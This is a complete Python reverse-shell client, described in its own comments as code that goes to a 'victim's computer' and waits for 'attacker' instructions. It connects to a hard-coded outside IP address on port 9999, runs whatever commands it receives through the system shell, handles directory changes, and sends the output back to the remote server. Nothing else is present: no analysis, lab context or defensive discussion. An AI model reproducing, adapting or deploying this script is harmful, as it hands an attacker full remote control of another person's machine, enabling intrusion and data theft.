# goes to victim's computer
# Try and Connect Sever
# Wait For attacker(server)'s instruction
# Takes the result and send them back

import socket
import os
import subprocess

s = socket.socket()
host = "159.203.100.222"
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_str = str(cmd.stdout.read(), "cp949") + str(cmd.stderr.read(), "cp949")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
        
